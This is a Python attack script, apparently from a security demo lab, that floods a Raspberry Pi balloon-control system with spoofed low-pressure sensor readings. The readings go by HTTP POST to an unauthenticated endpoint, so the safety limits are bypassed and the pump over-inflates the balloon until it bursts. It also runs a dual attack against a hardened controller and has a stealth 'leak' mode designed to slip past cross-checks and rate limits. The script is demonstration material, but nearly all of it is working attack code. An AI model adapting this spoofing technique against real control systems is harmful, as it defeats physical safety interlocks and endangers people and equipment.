#!/usr/bin/env python3
"""
Attack Script - Pressure Sensor Spoofing
Floods vulnerable balloon control system with fake low-pressure readings

This demonstrates how an attacker can bypass safety limits by spoofing
sensor data, causing the balloon to over-inflate and pop.

Attack Vector: HTTP POST to unauthenticated /sensor endpoint

Target: Pi #7 (Vulnerable System) - 192.168.50.100 (VLAN2)
"""

import time
import math
import requests
import argparse
import threading
from datetime import datetime
from collections import defaultdict

# Default targets
DEFAULT_TARGET = "http://192.168.50.100:5000"
DUAL_TARGETS = [
    {
        "name": "Vulnerable (Pi #7)",
        "url": "http://192.168.50.100:5000",
        "ip": "192.168.50.100",
        "vlan": "VLAN2"
    },
    {
        "name": "Secure (Pi #6)",
        "url": "http://10.30.0.25:5000",
        "ip": "10.30.0.25",
        "vlan": "VLAN30"
    }
]

def compute_pressure(fake_pressure, leak, t0):
    """Pressure to send right now.

    Returns the constant `fake_pressure`, unless leak=(start, floor, tau): then a
    fake "leak" that decays exponentially from start PSI toward floor PSI with
    time-constant tau seconds, measured from t0. This still drives the vulnerable
    pump (floor is below the 25 PSI setpoint) but looks like a plausible slow leak
    instead of a flat 0.0 — and while it stays within the secure controller's
    cross-check band and under its rate limit, it's a stealthier probe that only
    the HMAC signature check stops.
    """
    if not leak:
        return fake_pressure
    start, floor, tau = leak
    return round(floor + (start - floor) * math.exp(-(time.time() - t0) / tau), 2)

def attack_continuous(target_url, fake_pressure=0.0, interval=0.1, leak=None):
    """
    Continuously flood the system with fake sensor readings

    Args:
        target_url: Target balloon control API
        fake_pressure: Fake pressure value to send (PSI)
        interval: Delay between requests (seconds)
    """
    sensor_endpoint = f"{target_url}/sensor"

    print("=" * 60)
    print("PRESSURE SENSOR SPOOFING ATTACK")
    print("=" * 60)
    print(f"Target: {sensor_endpoint}")
    if leak:
        print(f"Fake Pressure: LEAK mode - {leak[0]} → {leak[1]} PSI, tau={leak[2]}s")
    else:
        print(f"Fake Pressure: {fake_pressure} PSI")
    print(f"Attack Rate: {1/interval:.1f} requests/second")
    print("=" * 60)
    print("\n⚠️  ATTACK IN PROGRESS")
    print("The system will believe pressure is low and keep inflating")
    print("Real balloon pressure will exceed safe limits!")
    print("\n(Ctrl+C to stop)\n")
    print("-" * 60)

    attack_count = 0
    success_count = 0
    error_count = 0
    t0 = time.time()

    try:
        while True:
            p = compute_pressure(fake_pressure, leak, t0)
            try:
                # Craft malicious payload
                payload = {
                    "pressure": p,
                    "temperature": 25.0,
                    "timestamp": datetime.now().isoformat(),
                    "source": "attacker",  # ⚠️ System doesn't validate this!
                    "sensor_type": "spoofed"
                }

                # Send attack request
                response = requests.post(
                    sensor_endpoint,
                    json=payload,
                    timeout=1
                )

                attack_count += 1

                if response.status_code == 200:
                    success_count += 1
                    result = response.json()
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                          f"✓ Spoofed: {p} PSI "
                          f"(Accepted: {success_count}/{attack_count}, "
                          f"Failures: {error_count})")
                else:
                    error_count += 1
                    print(f"✗ HTTP {response.status_code}: {response.text}")

            except requests.exceptions.ConnectionError:
                error_count += 1
                print(f"✗ Connection refused - is target system running?")
                time.sleep(2)  # Back off on connection errors
            except requests.exceptions.Timeout:
                error_count += 1
                print(f"✗ Request timeout")
            except Exception as e:
                error_count += 1
                print(f"✗ Error: {e}")

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n" + "=" * 60)
        print("ATTACK STOPPED")
        print("=" * 60)
        print(f"  Total attacks sent: {attack_count}")
        print(f"  Successful spoofs: {success_count}")
        print(f"  Failed requests: {error_count}")
        print(f"  Success rate: {(success_count/attack_count*100) if attack_count > 0 else 0:.1f}%")
        print("=" * 60)
        print("\nIMPACT:")
        print("  The vulnerable system accepted spoofed sensor data")
        print("  Safety limits were bypassed")
        print("  Balloon likely over-inflated and popped")
        print("=" * 60)

def attack_single(target_url, fake_pressure=0.0, leak=None):
    """Send a single spoofed sensor reading"""
    sensor_endpoint = f"{target_url}/sensor"

    p = compute_pressure(fake_pressure, leak, time.time())
    payload = {
        "pressure": p,
        "temperature": 25.0,
        "timestamp": datetime.now().isoformat(),
        "source": "attacker-single",
        "sensor_type": "spoofed"
    }

    print(f"Sending single spoofed reading: {p} PSI")
    response = requests.post(sensor_endpoint, json=payload, timeout=2)

    if response.status_code == 200:
        print(f"✓ Attack successful: {response.json()}")
    else:
        print(f"✗ Attack failed: HTTP {response.status_code}")

def attack_target_thread(target, fake_pressure, interval, stop_event, stats, stats_lock, leak=None, t0=None):
    """
    Attack a single target continuously until stop_event is set

    Args:
        target: Target dict with url, name, etc.
        fake_pressure: Fake pressure value to send (PSI)
        interval: Delay between requests (seconds)
        stop_event: Threading event to signal stop
        stats: Shared statistics dict
        stats_lock: Lock for thread-safe stats access
    """
    sensor_endpoint = f"{target['url']}/sensor"
    name = target['name']

    if t0 is None:
        t0 = time.time()
    while not stop_event.is_set():
        p = compute_pressure(fake_pressure, leak, t0)
        try:
            # Craft malicious payload
            payload = {
                "pressure": p,
                "temperature": 25.0,
                "timestamp": datetime.now().isoformat(),
                "source": "attacker",
                "sensor_type": "spoofed"
            }

            # Send attack request
            response = requests.post(
                sensor_endpoint,
                json=payload,
                timeout=1
            )

            with stats_lock:
                stats[name]["total"] += 1
                stats[name]["last"] = p

                if response.status_code == 200:
                    stats[name]["success"] += 1
                else:
                    stats[name]["error"] += 1

        except requests.exceptions.ConnectionError:
            with stats_lock:
                stats[name]["error"] += 1
                stats[name]["total"] += 1
        except requests.exceptions.Timeout:
            with stats_lock:
                stats[name]["error"] += 1
                stats[name]["total"] += 1
        except Exception as e:
            with stats_lock:
                stats[name]["error"] += 1
                stats[name]["total"] += 1

        time.sleep(interval)

def attack_dual(fake_pressure=0.0, interval=0.1, leak=None):
    """
    Continuously attack both vulnerable and secure systems simultaneously

    Args:
        fake_pressure: Fake pressure value in PSI (default: 0.0)
        interval: Delay between requests per target in seconds (default: 0.1 = 10 req/sec per target)
    """
    print("=" * 80)
    print("DUAL-TARGET PRESSURE SENSOR SPOOFING ATTACK")
    print("=" * 80)
    if leak:
        print(f"Fake Pressure: LEAK mode - {leak[0]} → {leak[1]} PSI, tau={leak[2]}s")
    else:
        print(f"Fake Pressure: {fake_pressure} PSI")
    print(f"Attack Rate: {1/interval:.1f} requests/second PER TARGET")
    print(f"Total Rate: {2/interval:.1f} requests/second COMBINED")
    print("=" * 80)

    for target in DUAL_TARGETS:
        print(f"\nTarget: {target['name']}")
        print(f"  URL: {target['url']}/sensor")
        print(f"  IP: {target['ip']} ({target['vlan']})")

    print("=" * 80)
    print("\n⚠️  DUAL ATTACK IN PROGRESS")
    print("\nExpected outcomes:")
    print("  - Vulnerable system (Pi #7): Will accept spoofed data → pump runs → bottle bursts")
    print("  - Secure system (Pi #6): Will reject spoofed data → pump stops → bottle safe")
    print("\n(Ctrl+C to stop)\n")
    print("-" * 80)

    # Statistics per target
    stats = defaultdict(lambda: {"success": 0, "error": 0, "total": 0, "last": fake_pressure})
    stats_lock = threading.Lock()
    stop_event = threading.Event()
    t0 = time.time()

    # Start attack threads for each target
    threads = []
    for target in DUAL_TARGETS:
        thread = threading.Thread(
            target=attack_target_thread,
            args=(target, fake_pressure, interval, stop_event, stats, stats_lock, leak, t0),
            daemon=True
        )
        thread.start()
        threads.append(thread)

    # Status update loop
    try:
        while True:
            # Print status line
            with stats_lock:
                status_parts = [f"[{datetime.now().strftime('%H:%M:%S')}]"]
                if leak:
                    status_parts.append(f"leak≈{compute_pressure(fake_pressure, leak, t0):.1f} PSI")

                for target in DUAL_TARGETS:
                    name = target['name']
                    s = stats[name]
                    total = s['total']
                    success = s['success']
                    error = s['error']
                    success_rate = (success / total * 100) if total > 0 else 0
                    status_parts.append(f"{name}: {success}/{total} ({success_rate:.0f}%)")

                print("\r" + "  |  ".join(status_parts) + "  ", end="", flush=True)

            time.sleep(1)

    except KeyboardInterrupt:
        print("\n\n" + "=" * 80)
        print("STOPPING ATTACK...")
        print("=" * 80)

        # Signal all threads to stop
        stop_event.set()

        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=2)

        # Final statistics
        print("\nFINAL STATISTICS:")
        print("=" * 80)

        for target in DUAL_TARGETS:
            name = target['name']
            s = stats[name]
            total = s['total']
            success = s['success']
            error = s['error']
            success_rate = (success / total * 100) if total > 0 else 0

            print(f"\n{name} ({target['ip']}):")
            print(f"  Total attacks sent: {total}")
            print(f"  Successful spoofs: {success}")
            print(f"  Failed requests: {error}")
            print(f"  Success rate: {success_rate:.1f}%")

        print("\n" + "=" * 80)
        print("EXPECTED IMPACT:")
        print("=" * 80)
        print(f"\n{DUAL_TARGETS[0]['name']} (192.168.50.100):")
        print("  ✗ Accepted spoofed sensor data")
        print("  ✗ Safety limits bypassed")
        print("  ✗ Balloon likely over-inflated and burst")

        print(f"\n{DUAL_TARGETS[1]['name']} (10.30.0.25):")
        print("  ✓ Rejected spoofed sensor data")
        print("  ✓ Cross-checked against I2C sensor")
        print("  ✓ Logged all attacks to Wazuh SIEM")
        print("  ✓ Balloon remained at safe pressure")
        print("=" * 80)

def check_target(target_url):
    """Check if target system is reachable"""
    try:
        response = requests.get(target_url, timeout=2)
        info = response.json()
        print("=" * 60)
        print("TARGET SYSTEM INFORMATION")
        print("=" * 60)
        print(f"  System: {info.get('system', 'Unknown')}")
        print(f"  Pi: {info.get('pi', 'Unknown')}")
        print(f"  VLAN: {info.get('vlan', 'Unknown')}")
        print(f"  Security: {info.get('security', 'Unknown')}")
        print("=" * 60)
        return True
    except Exception as e:
        print(f"✗ Cannot reach target: {e}")
        return False

def check_dual_targets():
    """Check if both dual target systems are reachable"""
    print("=" * 80)
    print("CHECKING DUAL TARGET SYSTEMS")
    print("=" * 80)

    all_reachable = True

    for target in DUAL_TARGETS:
        try:
            response = requests.get(target['url'], timeout=2)
            info = response.json()

            print(f"\n✓ {target['name']} ({target['ip']}):")
            print(f"  System: {info.get('system', 'Unknown')}")
            print(f"  Pi: {info.get('pi', 'Unknown')}")
            print(f"  VLAN: {info.get('vlan', 'Unknown')}")
            print(f"  Security: {info.get('security', 'N/A')}")

        except Exception as e:
            print(f"\n✗ {target['name']} ({target['ip']}): UNREACHABLE")
            print(f"  Error: {e}")
            all_reachable = False

    print("=" * 80)
    return all_reachable

def main():
    parser = argparse.ArgumentParser(
        description="Pressure sensor spoofing attack for balloon demo",
        epilog="Examples:\n"
               "  Single target:  python3 attack_spoof.py --continuous --pressure 20.0\n"
               "  Dual targets:   python3 attack_spoof.py --dual --pressure 20.0\n"
               "  Check targets:  python3 attack_spoof.py --dual --check",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        '--target',
        default=DEFAULT_TARGET,
        help=f'Single target URL (default: {DEFAULT_TARGET})'
    )
    parser.add_argument(
        '--pressure',
        type=float,
        default=20.0,
        help='Fake pressure value in PSI (default: 20.0 - below target to keep pump running)'
    )
    parser.add_argument(
        '--continuous',
        action='store_true',
        help='Continuous flooding attack on single target'
    )
    parser.add_argument(
        '--dual',
        action='store_true',
        help='Attack BOTH vulnerable and secure systems simultaneously'
    )
    parser.add_argument(
        '--rate',
        type=float,
        default=0.1,
        help='Attack interval in seconds (default: 0.1 = 10 req/sec per target)'
    )
    parser.add_argument(
        '--check',
        action='store_true',
        help='Check if target(s) are reachable and exit'
    )
    parser.add_argument(
        '--leak',
        action='store_true',
        help='Stealth mode: send a fake exponential "leak" curve instead of a constant pressure'
    )
    parser.add_argument(
        '--leak-start',
        type=float,
        default=25.0,
        help='LEAK mode: starting PSI (default: 25.0)'
    )
    parser.add_argument(
        '--leak-floor',
        type=float,
        default=10.0,
        help='LEAK mode: PSI the leak settles toward (default: 10.0)'
    )
    parser.add_argument(
        '--leak-tau',
        type=float,
        default=2.5,
        help='LEAK mode: decay time-constant in seconds, bigger = slower (default: 2.5)'
    )

    args = parser.parse_args()
    leak = (args.leak_start, args.leak_floor, args.leak_tau) if args.leak else None

    # Add http:// if no scheme provided (single target mode only)
    if not args.dual:
        if not args.target.startswith('http://') and not args.target.startswith('https://'):
            args.target = f'http://{args.target}'

    # Dual target mode
    if args.dual:
        if args.check or True:  # Always check in dual mode
            if not check_dual_targets():
                print("\n⚠️  WARNING: One or more targets are unreachable!")
                if not args.check:
                    response = input("Continue anyway? (y/N): ")
                    if response.lower() != 'y':
                        return 1
            if args.check:
                return 0

        # Execute dual attack
        attack_dual(args.pressure, args.rate, leak)
        return 0

    # Single target mode
    else:
        # Check target first
        if args.check or args.continuous:
            if not check_target(args.target):
                return 1
            if args.check:
                return 0

        # Execute attack
        if args.continuous:
            attack_continuous(args.target, args.pressure, args.rate, leak)
        else:
            attack_single(args.target, args.pressure, leak)

        return 0

if __name__ == "__main__":
    exit(main())
